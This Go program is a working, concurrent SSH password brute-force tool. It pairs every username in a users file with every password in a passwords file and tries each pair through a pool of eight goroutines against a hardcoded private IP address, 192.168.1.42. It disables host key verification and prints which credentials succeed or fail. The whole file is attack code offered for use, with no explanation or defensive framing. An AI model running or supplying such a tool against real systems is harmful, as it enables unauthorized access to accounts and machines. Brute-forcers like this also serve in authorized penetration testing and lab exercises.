package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

const TARGET = "192.168.1.42"

type credential struct {
	user      string
	pass      string
	pos       string
	timeTaken time.Duration
	err       error
}

type request struct {
	cred *credential
	resp chan<- *result
}

type result struct {
	cred *credential
	res  string
	err  error
}

func check(e error) {
	if e != nil {
		fmt.Println("[error] ", e)
	}
}

var wg sync.WaitGroup

// Dictionary reader, the answer flow to the return channel
func readFiles(
	userFile string,
	passFile string,
) <-chan *credential {
	credentialStream := make(chan *credential)
	go func() {
		defer close(credentialStream)

		f1, err := os.Open(userFile)
		check(err)
		f2, err := os.Open(passFile)
		check(err)

		// define closing of files
		defer func() {
			f1.Close()
			f2.Close()
		}()

		// File reader line by line.
		ureader := bufio.NewScanner(f1)
		preader := bufio.NewScanner(f2)

		var userList []string // it is saved in an array so as not to read the user list again
		for i := 0; preader.Scan(); i++ {
			if i == 0 {
				for j := 0; ureader.Scan(); j++ {
					userList = append(userList, ureader.Text())
					credentialStream <- &credential{user: userList[len(userList)-1],
						pass:      preader.Text(),
						pos:       strconv.Itoa(i) + "-" + strconv.Itoa(j),
						timeTaken: 0,
						err:       nil}
				}
				if err := ureader.Err(); err != nil {
					check(err)
				}
			} else {
				for j, u := range userList {
					credentialStream <- &credential{user: u,
						pass:      preader.Text(),
						pos:       strconv.Itoa(i) + "-" + strconv.Itoa(j),
						timeTaken: 0,
						err:       nil}
				}
			}
		}
		if err := preader.Err(); err != nil {
			check(err)
		}
	}()
	return credentialStream
}

func worker(reqChan <-chan *request) {
	for {
		if r, ok := <-reqChan; ok {
			res, err := r.cred.SSHtest()
			// res, err := r.cred.attackTest()
			r.resp <- &result{cred: r.cred, res: res, err: err}
		} else {
			fmt.Println("F worker")
			break
		}

	}

}

// func (c *credential) attackTest() (string, error) {
// 	time.Sleep(time.Millisecond * 10)
// 	return "ok", nil
// }

// Test SSH
func (c *credential) SSHtest() (string, error) {
	//SSH basic connection
	config := &ssh.ClientConfig{
		User: c.user,
		Auth: []ssh.AuthMethod{
			ssh.Password(c.pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	//Recover function
	defer func() {
		r := recover()
		if r != nil {
			fmt.Println(r)
		}
	}()

	t := net.JoinHostPort(TARGET, "22")

	_, err := ssh.Dial("tcp", t, config)

	if err != nil {
		return "", err
	}
	return "ok", err
}

func (c *credential) resolveConcurrently(reqChan chan<- *request, credChan chan<- *credential) {
	startTime := time.Now()
	defer func() {
		c.timeTaken = time.Since(startTime)
	}()

	credRespChan := make(chan *result)
	reqChan <- &request{cred: c, resp: credRespChan}
	resp := <-credRespChan
	if resp.err != nil {
		c.err = resp.err
	}
	credChan <- c
	wg.Done()
}

func doConcurrently(reqChan chan<- *request, credList <-chan *credential) {
	credChan := make(chan *credential)
	numCredentials := 0

	go func() {
		for c := range credList {
			numCredentials++
			wg.Add(1)
			go c.resolveConcurrently(reqChan, credChan)
		}

		wg.Wait()
		close(credChan)
		close(reqChan)
		fmt.Println("[!]Closing the channels...")
	}()

	for c := range credChan {
		if c.err == nil {
			fmt.Printf("[+] %v\t%v\t%v\t%v\n", c.user+":"+c.pass, c.pos, c.timeTaken, c.err)
		} else {
			// var a string
			// a = c.err
			fmt.Printf("[-] %v\t%v\t%v\t%v\n", c.user+":"+c.pass, c.pos, c.timeTaken, c.err.Error()[:30]+"...")
		}
	}

	fmt.Println("##############  finish")
}

func resolveConcurrently(nPoolSize int) {
	reqChan := make(chan *request)

	for i := 0; i < nPoolSize; i++ {
		go worker(reqChan)
	}

	doConcurrently(reqChan, readFiles("../users.txt", "../passwords.txt"))
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())

	start := time.Now()

	resolveConcurrently(8)
	// return time.Since(start)
	fmt.Printf("Atack took: %v", time.Since(start))
}
